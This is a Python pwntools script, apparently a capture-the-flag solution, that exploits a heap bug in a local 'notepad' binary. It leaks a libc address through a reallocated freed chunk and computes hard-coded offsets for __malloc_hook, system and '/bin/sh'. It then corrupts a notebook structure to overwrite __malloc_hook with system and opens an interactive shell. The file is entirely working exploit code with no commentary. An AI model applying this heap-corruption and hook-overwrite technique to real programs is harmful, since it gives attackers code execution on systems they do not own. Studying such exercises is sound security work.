#!/usr/bin/env python3

from pwn import *
import sys

r = process("./notepad")
# context.log_level = "debug"

r.recvuntil("> ")
r.sendline("a")
r.recvuntil("Enter notebook name: ")
r.sendline("AAAA")
r.recvuntil("> ")

r.sendline("p")
r.recvuntil("Enter index of a notebook to pick: ")
r.sendline("1")
r.recvuntil("> ")

# add tab 0x500
r.sendline("a")
r.recvuntil("Enter tab name: ")
r.sendline("1")
r.recvuntil("Enter data length (in bytes): ")
r.sendline(str(0x500))
r.recvuntil("Enter the data: ")
r.sendline("A")
r.recvuntil("> ")

# add tab 0x80 
r.sendline("a")
r.recvuntil("Enter tab name: ")
r.sendline("1")
r.recvuntil("Enter data length (in bytes): ")
r.sendline(str(0x80))
r.recvuntil("Enter the data: ")
r.sendline("A")
r.recvuntil("> ")

# delete 1
r.sendline("d")
r.recvuntil("Enter index of tab to delete: ")
r.sendline("1")
r.recvuntil("> ")

# add tab 0x500
r.sendline("a")
r.recvuntil("Enter tab name: ")
r.sendline("1")
r.recvuntil("Enter data length (in bytes): ")
r.sendline(str(0x500))
r.recvuntil("Enter the data: ")
r.sendline("")
r.recvuntil("> ")

# view tab 2
r.sendline("v")
r.recvuntil("Enter index of a tab to view: ")
r.sendline("2")
data = r.recvuntil("> ")

libc_leak = u64(data[:6].ljust(8, b"\x00"))
libc_address = libc_leak - 0x3ebc0a 
malloc_hook = libc_address + 0x3ebc30
system = libc_address + 0x4f440
binsh = libc_address + 0x1b3e9a

print("Libc leak: 0x%x" % libc_leak)
print("Libc base: 0x%x" % libc_address)
print("Malloc hook address: 0x%x" % malloc_hook)
print("System address: 0x%x" % system)
print("/bin/sh address: 0x%x" % binsh)

r.sendline("q")
r.recvuntil("> ")

r.sendline("d")
r.recvuntil("Enter index of a notebook to delete: ")
r.sendline("1")
r.recvuntil("> ")

# OVERRIDE 

# set name
r.sendline("a")
r.recvuntil("Enter notebook name: ")

payload = (
    b"A" * 16+
    p64(0x7fffffffffffffff) +
    b"B" * 16 +
    p64(0x8) +
    p64(malloc_hook)
)
r.sendline(payload)
r.recvuntil("> ")

# pick notebook
r.sendline("p")
r.recvuntil("Enter index of a notebook to pick: ")
r.sendline("1")
r.recvuntil("> ")

# update tab
r.sendline("u")
r.recvuntil("Enter index of tab to update: ")
r.sendline("1")
r.recvuntil("Enter new tab name (leave empty to skip): ")
r.sendline("")
r.recvuntil("Enter new data length (leave empty to keep the same): ")
r.sendline("")
r.recvuntil("Enter the data: ")
r.sendline(p64(system))
r.recvuntil("> ")

# add tab invoke /bin/sh
r.sendline("a")
r.recvuntil("Enter tab name: ")
r.sendline("AAAA")
r.recvuntil("Enter data length (in bytes): ")
r.sendline(str(binsh))
r.recvuntil("Enter the data: ")

r.interactive()
